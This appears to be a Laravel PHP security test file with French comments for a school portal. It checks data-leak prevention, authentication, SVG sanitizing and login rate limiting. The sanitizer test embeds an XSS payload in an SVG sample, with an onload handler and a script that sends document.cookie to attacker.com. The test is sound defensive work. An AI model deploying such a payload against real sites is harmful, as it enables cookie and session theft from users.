<?php

namespace Tests\Feature;

use App\Models\Ecole;
use App\Models\Utilisateur;
use App\Services\SvgSanitizerService;
use Illuminate\Foundation\Testing\TestCase;

class SecurityHardeningTest extends TestCase
{
    public function createApplication()
    {
        $app = require __DIR__ . '/../../bootstrap/app.php';
        $app->make(\Illuminate\Contracts\Console\Kernel::class)->bootstrap();
        return $app;
    }

    /**
     * Teste que l'endpoint detectSchool ne divulgue PAS les données personnelles de l'étudiant (CNDP / RGPD).
     */
    public function test_detect_school_does_not_leak_student_personal_data(): void
    {
        $response = $this->getJson('/myportal/detect-school?query=E2026-9901');
        $response->assertStatus(200);

        $json = $response->json();
        $this->assertTrue($json['found'] ?? false);
        $this->assertEquals('student', $json['type'] ?? null);
        $this->assertArrayHasKey('ecole', $json);

        // Vérification stricte : aucune information d'identité personnelle n'est exposée à des tiers anonymes
        $this->assertArrayNotHasKey('student', $json);
        $this->assertArrayNotHasKey('nom', $json);
        $this->assertArrayNotHasKey('prenom', $json);
        $this->assertArrayNotHasKey('email', $json);
    }

    /**
     * Teste que la route /sublime est strictement protégée par authentification.
     */
    public function test_sublime_route_requires_authentication(): void
    {
        $response = $this->get('/sublime');
        $response->assertRedirect('/');
    }

    /**
     * Teste que SvgSanitizerService élimine les scripts et événements malveillants.
     */
    public function test_svg_sanitizer_removes_malicious_scripts_and_events(): void
    {
        $maliciousSvg = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"><circle cx="50" cy="50" r="40"/><script>fetch("https://attacker.com?leak=" + document.cookie)</script></svg>';
        $cleanSvg = SvgSanitizerService::sanitize($maliciousSvg);

        $this->assertNotFalse($cleanSvg);
        $this->assertStringNotContainsString('<script', $cleanSvg);
        $this->assertStringNotContainsString('onload', $cleanSvg);
        $this->assertStringNotContainsString('attacker.com', $cleanSvg);
        $this->assertStringContainsString('<circle', $cleanSvg);
    }

    /**
     * Teste que le rate-limiting sur le login bloque les attaques par force brute.
     */
    public function test_login_rate_limiting_blocks_brute_force(): void
    {
        for ($i = 0; $i < 6; $i++) {
            $this->post('/portal/ENS-2026/login', [
                'identifiant'  => 'fake_matricule_xyz',
                'mot_de_passe' => 'wrong_pass'
            ]);
        }

        $blockedResponse = $this->post('/portal/ENS-2026/login', [
            'identifiant'  => 'fake_matricule_xyz',
            'mot_de_passe' => 'wrong_pass'
        ]);

        $blockedResponse->assertSessionHasErrors('auth');
    }
}
